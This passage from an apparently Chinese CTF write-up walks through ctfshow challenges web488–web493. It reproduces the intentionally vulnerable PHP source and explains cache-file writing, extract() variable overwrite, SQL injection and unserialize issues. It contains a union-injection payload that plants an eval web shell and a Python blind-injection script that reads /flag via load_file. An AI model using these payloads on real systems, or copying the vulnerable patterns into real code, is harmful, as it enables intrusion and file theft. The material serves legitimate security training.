   break    print(result)</code></pre><h1 id="web488"><a href="#web488" class="headerlink" title="web488"></a>web488</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-09 11:59:28 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    $username=$_GET[&#39;username&#39;];    $password=$_GET[&#39;password&#39;];    $sql = &quot;select id from user where username = &#39;&quot;.md5($username).&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;#这次的sql不可用了    $user=db::select_one($sql);    if($user)&#123;        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));    &#125;else&#123;        templateUtil::render(&#39;error&#39;,array(&#39;username&#39;=&gt;$username));    &#125;&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>&#x2F;render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-08 22:15:24 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-08 22:29:27 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class db&#123;        public static  function getConnection()&#123;         $username=&#39;root&#39;;         $password=&#39;root&#39;;         $port=&#39;3306&#39;;         $addr=&#39;127.0.0.1&#39;;         $database=&#39;ctfshow&#39;;        return new mysqli($addr,$username,$password,$database);    &#125;    public static function select_one($sql)&#123;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;cache_class</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-08 21:40:10 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-08 21:23:28 email: h1xa@ctfer.com link: https://ctfer.com*/ini_set(&#39;display_errors&#39;, &#39;On&#39;);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>首先我们先把目录结构写好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102110451.png" alt="image-20220411102110451"></p><p>如果sql注入不可使用的话,就只有file_class.php文件的wrrite方法可以利用了,至于为什么上一关不可利用,我们等会就知道了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102318520.png" alt="image-20220411102318520"></p><p>我们发现传了两个参数进来,一个是文件名,另一个是文件内容.我们直接转到用例ctrl+b </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102428030.png" alt="image-20220411102428030"></p><p>发现只有这一处,条件是这个传入的template文件的md5(template)文件不存在,我们接着寻找谁调用了create_cache</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102622460.png" alt="image-20220411102622460"></p><p>也是只有一处,传入了两个参数,一个文件名一个内容,条件是if后面的返回false</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102822927.png" alt="image-20220411102822927"></p><p>也就是这里没有这个md5(template)这个文件,接着回到render_class.php文件</p><p>接着往上推,发现内容cache在传入之前先调用了shade方法并且传入了数组,我们先看下面的是将参数进行替换并且替换的是,接着在替换之前有一部读取文件的操作,读取的是初始文件名,不是md5的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103133848.png" alt="image-20220411103133848"></p><p>接着我们去找谁调用了render</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103218434.png" alt="image-20220411103218434"></p><p>发现这里总共有四处,第一处仔细观察是无法利用的,因为只要你访问了一次index文件,就会在本地生成md5(index),之后就再也不会能写文件了,而下面两个并没有传入数组参数,这么说的话就没有办法进行替换操作,那么自然也就不能写文件进去,那么只剩下第二个文件了.如果这里能做的话,就只能说明error.php里面存在</p><pre><code>&#123;&#123;username&#125;&#125;</code></pre><p>我们来尝试一下,写入以下内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103521026.png" alt="image-20220411103521026"></p><p>返回index文件进行调试,注意处理一下index文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103553676.png" alt="image-20220411103553676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103632717.png" alt="image-20220411103632717"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103705971.png" alt="image-20220411103705971"></p><p>关键步骤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103726475.png" alt="image-20220411103726475"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103744290.png" alt="image-20220411103744290"></p><p>可见木马写入了这个md5(error)文件里面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103838783.png" alt="image-20220411103838783"></p><p>接下来我们从题目里面实现一下,照index文件填入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104009891.png" alt="image-20220411104009891"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104056974.png" alt="image-20220411104056974"></p><p>接着访问&#x2F;cache&#x2F;cb5e100e5a9a3e7f6d1fd97512215282.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104157508.png" alt="image-20220411104157508"></p><p>我们去看一下它error.php的源码,发现和我们想的一样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104302975.png" alt="image-20220411104302975"></p><p>但是不知道你有没有发现一个问题,就是如果我们第一次就直接尝试登录,一个错误的username,就会生成error的md5文件,之后就不能在向里面写文件了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104517364.png" alt="image-20220411104517364"></p><p>我们这样无论怎么发送都不能在写文件了,所以只有一次机会</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104626210.png" alt="image-20220411104626210"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104643730.png" alt="image-20220411104643730"></p><h1 id="web489"><a href="#web489" class="headerlink" title="web489"></a>web489</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:20:04 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    $sql = &quot;select id from user where username = &#39;&quot;.md5($username).&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;    extract($_GET);    $user=db::select_one($sql);    if($user)&#123;        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-09 12:11:43 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-09 12:11:32 email: h1xa@ctfer.com link: https://ctfer.com*/class db&#123;        public static  function getConnection()&#123;         $username=&#39;root&#39;;         $password=&#39;root&#39;;         $port=&#39;3306&#39;;         $addr=&#39;127.0.0.1&#39;;         $database=&#39;ctfshow&#39;;        return new mysqli($addr,$username,$password,$database);    &#125;    public static function select_one($sql)&#123;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;&#125;</code></pre><p>file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:08:48 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-09 12:11:38 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;&#125;</code></pre><p>&#x2F;templates&#x2F;index</p><pre><code class="php">&lt;!--# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 16:54:39 Last Modified by:   h1xa Last Modified time: 2021-03-08 21:56:49 email: h1xa@ctfer.com link: https://ctfer.com path /templates/index.php--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    欢迎你&#123;&#123;username&#125;&#125;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这里就解决了上一题的问题了.可以删除文件了,这里还考察了一个点,就是变量覆盖</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125917354.png" alt="image-20220411125917354"></p><p>等到extract()函数解析完成就可以</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125924937.png" alt="image-20220411125924937"></p><p>因此这里就可以直接和上一关一样,先重置sql语句使执行第一个render()接着传入username为一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130153307.png" alt="image-20220411130153307"></p><p>接着这次访问md5(index)文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130313269.png" alt="image-20220411130313269"></p><p>可以看到这里的error.php是无法利用的了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130349070.png" alt="image-20220411130349070"></p><h1 id="web490"><a href="#web490" class="headerlink" title="web490"></a>web490</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-09 16:45:24 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    extract($_GET);    $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;    $user=db::select_one($sql);    if($user)&#123;        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$user-&gt;username));    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>这里也是含有sql注入的.这次只不过是把从sql取出的语句进行写入</p><p>记得先清一下文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140331722.png" alt="image-20220411140331722"></p><p>接着登录发现是短标签,我们只要按照这个方式闭合就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140305568.png" alt="image-20220411140305568"></p><pre><code>select username from user where username = &#39;1&#39;union select &#39;@eval($_POST[zf]);&#39;&#39; and password=&#39;6512bd43d9caa6e02c990b0a82652dca&#39; order by id limit 1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140520958.png" alt="image-20220411140520958"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140614700.png" alt="image-20220411140614700"></p><h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-09 16:45:24 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    extract($_GET);    $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;    $user=db::select_one($sql);    if($user)&#123;        templateUtil::render(&#39;index&#39;);    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>数据库里没东西</p><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-09 16:19:23 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;?=&#39;.$value.&#39;?&gt;&#39;, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-09 12:11:38 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;&#125;</code></pre><p>这里也没有可以利用的点,那么只能在sql注入里面动手了.那么直接利用sql读取本地文件</p><pre><code class="php">import requestsurl = &quot;http://de4a1753-a35d-401e-9d4e-aad8aa7d89a2.challenge.ctf.show/index.php&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        payload = &quot;select load_file(&#39;/flag&#39;)&quot;        params = &#123;            &#39;username&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- + #&quot;,            &#39;password&#39;: &#39;1&#39;,            &#39;action&#39; : &#39;check&#39;        &#125;        r = requests.get(url,params=params)        #print(r.text)        if &quot;username&quot;  in r.text:            head = mid + 1        else:            tail = mid    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-10 12:16:25 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    header(&#39;location:index.php?action=login&#39;);    die();    &#125;if($action==&#39;check&#39;)&#123;    extract($_GET);    if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&#123;        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;        $user=db::select_one_array($sql);    &#125;    if($user)&#123;        templateUtil::render(&#39;index&#39;,$user);    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>render&#x2F;render_class</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-10 13:37:14 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;！--&#39;.$value.&#39;--&gt;&#39;, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-10 12:12:00 email: h1xa@ctfer.com link: https://ctfer.com*/class db&#123;        public static  function getConnection()&#123;         $username=&#39;root&#39;;         $password=&#39;root&#39;;         $port=&#39;3306&#39;;         $addr=&#39;127.0.0.1&#39;;         $database=&#39;ctfshow&#39;;        return new mysqli($addr,$username,$password,$database);    &#125;    public static function select_one($sql)&#123;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public static function select_one_array($sql)&#123;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;&#125;</code></pre><p>templates&#x2F;index.php</p><pre><code class="php">&lt;!--# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 16:54:39 Last Modified by:   h1xa Last Modified time: 2021-03-09 16:21:04 email: h1xa@ctfer.com link: https://ctfer.com path /templates/index.php--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &#123;&#123;username&#125;&#125;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code>/^[A-Za-z0-9]+$/    表示匹配以数字字母开头结尾中间全是数字字母</code></pre><p>那么这里简单变量覆盖就可,但是要注意一下将它的注释进行闭合</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200031843.png" alt="image-20220411200031843"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200106381.png" alt="image-20220411200106381"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200118887.png" alt="image-20220411200118887"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200135182.png" alt="image-20220411200135182"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200208135.png" alt="image-20220411200208135"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201037379.png" alt="image-20220411201037379"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201043845.png" alt="image-20220411201043845"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201050704.png" alt="image-20220411201050704"></p><h1 id="web493"><a href="#web493" class="headerlink" title="web493"></a>web493</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-12 17:23:33 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    if(isset($_COOKIE[&#39;user&#39;]))&#123;        $c=$_COOKIE[&#39;user&#39;];        $user=unserialize($c);        if($user)&#123;            templateUtil::render(&#39;index&#39;);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;    die();    &#125;if($action==&#39;check&#39;)&#123;    extract($_GET);    if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&#123;        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;        $db=new db();        $user=$db-&gt;select_one($sql);    &#125;    if($user)&#123;        setcookie(&#39;user&#39;,$user);        templateUtil::render(&#39;index&#39;);    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-12 15:52:18 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;！--&#39;.$value.&#39;--&gt;&#39;, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-12 17:43:56 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class db&#123;        public $db;    public $log;    public $sql;    public $username=&#39;root&#39;;    public $password=&#39;root&#39;;    public $port=&#39;3306&#39;;    public $addr=&#39;127.0.0.1&#39;;    public $database=&#39;ctfshow&#39;;    public function __construct()&#123;        $this-&gt;log=new dbLog();        $this-&gt;db=$this-&gt;getConnection();    &#125;    public function getConnection()&#123;                 return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);    &#125;    public  function select_one($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public  function select_one_array($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;    public function __destruct()&#123;        $this-&gt;log-&gt;log($this-&gt;sql);    &#125;&#125;class dbLog&#123;    public $sql;    public $content;    public $log;    public function __construct()&#123;        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;    &#125;    public function log($sql)&#123;        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;    &#125;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;</code></pre><p>&#x2F;render&#x2F;file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:08:48 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-09 12:11:38 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);    